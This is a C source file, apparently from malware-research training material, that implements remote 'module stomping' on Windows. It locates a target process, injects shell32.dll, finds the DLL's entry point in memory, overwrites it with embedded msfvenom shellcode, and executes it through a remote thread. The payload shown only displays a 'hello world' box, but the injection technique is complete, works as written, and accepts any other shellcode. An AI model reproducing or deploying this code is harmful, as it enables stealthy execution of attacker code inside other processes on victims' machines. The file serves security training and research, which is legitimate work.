/* 
 * hack.c - remote module stomping
 * victim DLL: shell32.dll
 * author: @cocomelonc
 * for DEFCON training exercises on malware research for ethical hackers
 * ANSI / char* version
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// Get remote DLL load address
DWORD_PTR GetRemoteDllLoadAddress(HANDLE hProcess, const char* dllName) {
   if (hProcess == NULL) {
    printf("invalid process handle error: %d\n", GetLastError());
    return 0;
  }
 
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, GetProcessId(hProcess));
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    printf("CreateToolhelp32Snapshot failed error: %d\n", GetLastError());
    return 0;
  }
 
  // MODULEENTRY32 uses char szModule[] in ANSI mode
  MODULEENTRY32 me32;
  me32.dwSize = sizeof(MODULEENTRY32);
  DWORD_PTR loadAddress = 0;
 
  if (Module32First(hSnapshot, &me32)) {
    do {
      // _stricmp (ANSI case-insensitive compare)
      if (_stricmp(me32.szModule, dllName) == 0) {
        loadAddress = (DWORD_PTR)me32.modBaseAddr;
        break;
      }
    } while (Module32Next(hSnapshot, &me32));
  }
 
  CloseHandle(hSnapshot);
  return loadAddress;
}
 
DWORD_PTR GetRemoteDllEntryPoint(HANDLE hProcess, DWORD_PTR loadAddress) {
  if (hProcess == NULL || loadAddress == 0) {
    printf("invalid process handle or load address error: %d\n", GetLastError());
    return 0;
  }
 
  IMAGE_DOS_HEADER dosHeader;
  SIZE_T bytesRead;
  if (!ReadProcessMemory(hProcess, (LPCVOID)loadAddress, &dosHeader, sizeof(IMAGE_DOS_HEADER), &bytesRead) || bytesRead != sizeof(IMAGE_DOS_HEADER)) {
    printf("ReadProcessMemory failed error: %d\n", GetLastError());
    return 0;
  }
 
  if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
    printf("invalid IMAGE_DOS_SIGNATURE error: %d\n", GetLastError());
    return 0;
  }
 
  IMAGE_NT_HEADERS ntHeaders;
  if (!ReadProcessMemory(hProcess, (LPCVOID)(loadAddress + dosHeader.e_lfanew), &ntHeaders, sizeof(IMAGE_NT_HEADERS), &bytesRead) || bytesRead != sizeof(IMAGE_NT_HEADERS)) {
    printf("ReadProcessMemory IMAGE_NT_HEADERS error: %d\n", GetLastError());
    return 0;
  }
 
  if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) {
    printf("IMAGE_NT_SIGNATURE error: %d\n", GetLastError());
    return 0;
  }
 
  return (DWORD_PTR)(loadAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);
}

// find process ID by process name
int findMyProc(const char *procname) {

  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  int pid = 0;
  BOOL hResult;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes
  // and exit if unsuccessful
  while (hResult) {
    // if we find the process: return process ID
    if (strcmp(procname, pe.szExeFile) == 0) {
      pid = pe.th32ProcessID;
      break;
    }
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return pid;
}
 
int main(int argc, char* argv[]) {

  int pid = 0;
  if (argc < 2) {
    printf("Usage: %s <PID>\n", argv[0]);
    return -1;
  }
 
  char sampleDLL[] = "C:\\windows\\system32\\shell32.dll";
  HANDLE process_handle;

  pid = findMyProc(argv[1]);
  
  // get handle to remote process
  process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));
  if (process_handle == NULL) {
    printf("could not open process: %d\n", GetLastError());
    return -1;
  }
 
  // allocate memory for the DLL path string
  LPVOID buffer = VirtualAllocEx(process_handle, NULL, sizeof(sampleDLL), (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
 
  // write DLL path to remote process
  WriteProcessMemory(process_handle, buffer, sampleDLL, sizeof(sampleDLL), NULL);
 
  // explicitly call GetModuleHandleA (ANSI version)
  HMODULE k32_handle = GetModuleHandleA("kernel32.dll");
  VOID* load_library = (VOID*)GetProcAddress(k32_handle, "LoadLibraryA");
 
  // Inject the DLL
  HANDLE remote_thread = CreateRemoteThread(process_handle, NULL, 0, (LPTHREAD_START_ROUTINE)load_library, buffer, 0, NULL);
  if (remote_thread) {
      WaitForSingleObject(remote_thread, INFINITE);
      CloseHandle(remote_thread);
  }

  printf("DLL successfully injected. press <ENTER> to overwrite EntryPoint with shellcode...\n");
  getchar();
 
  const char* dllName = "shell32.dll"; 
  DWORD_PTR dllLoadAddress = GetRemoteDllLoadAddress(process_handle, dllName);
  
  if (dllLoadAddress != 0) {
    printf("Loaded address of DLL: 0x%p\n", (void*)dllLoadAddress);
  } else {
    printf("Failed to find DLL load address\n");
    CloseHandle(process_handle);
    return -1;
  }
 
  DWORD_PTR entryPointAddress = GetRemoteDllEntryPoint(process_handle, dllLoadAddress);
  if (entryPointAddress != 0) {
    printf("address of EntryPoint: 0x%p\n", (void*)entryPointAddress);
  }
  else {
    printf("failed to retrieve EP address\n");
    CloseHandle(process_handle);
    return -1;
  }
 
  // msfvenom shellcode (hello world)
  unsigned char shellcode[] =
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3"; 
 
  // overwrite the EntryPoint of the loaded DLL in memory
  WriteProcessMemory(process_handle, (LPVOID)entryPointAddress, (LPCVOID)shellcode, sizeof(shellcode), NULL);
 
  // execute the shellcode by calling the modified EntryPoint
  CreateRemoteThread(process_handle, NULL, 0, (PTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);
 
  CloseHandle(process_handle);
  printf("successfully executed\n");

  return 0;
}